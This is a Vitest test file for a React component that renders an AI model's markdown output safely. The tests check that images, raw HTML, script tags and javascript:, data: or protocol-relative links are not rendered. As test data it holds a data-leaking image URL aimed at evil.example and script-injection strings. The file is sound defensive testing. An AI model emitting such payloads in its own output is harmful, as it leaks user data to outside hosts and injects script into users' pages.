import { describe, expect, it } from "vitest";
import { render } from "@testing-library/react";
import { AssistantMarkdown } from "@/components/assistant/assistant-markdown";

describe("AssistantMarkdown (model output is untrusted)", () => {
  it("never renders images — a remote image URL would leak data the moment it loads", () => {
    const { container } = render(
      <AssistantMarkdown
        text={"![x](https://evil.example/leak?d=secret) and <img src='https://evil.example/x'>"}
      />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("does not render raw HTML", () => {
    const { container } = render(
      <AssistantMarkdown text={"<script>alert(1)</script><b>bold</b> ok"} />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
  });

  it("makes only http(s) and relative links clickable, hardened", () => {
    const { container } = render(
      <AssistantMarkdown
        text={
          "[web](https://example.com/a) [rel](/holdings) [js](javascript:alert(1)) [data](data:text/html,x) [proto](//evil.example)"
        }
      />,
    );
    const links = [...container.querySelectorAll("a")];
    expect(links.map((a) => a.getAttribute("href"))).toEqual([
      "https://example.com/a",
      "/holdings",
    ]);
    for (const a of links) {
      expect(a.getAttribute("target")).toBe("_blank");
      expect(a.getAttribute("rel")).toContain("noopener");
      expect(a.getAttribute("rel")).toContain("noreferrer");
    }
    // The unsafe ones keep their text but are not links.
    expect(container.textContent).toContain("js");
    expect(container.textContent).toContain("proto");
  });

  it("renders GFM tables and lists", () => {
    const { container } = render(
      <AssistantMarkdown text={"| A | B |\n|---|---|\n| 1 | 2 |\n\n- one\n- two"} />,
    );
    expect(container.querySelectorAll("table th")).toHaveLength(2);
    expect(container.querySelectorAll("li")).toHaveLength(2);
  });
});
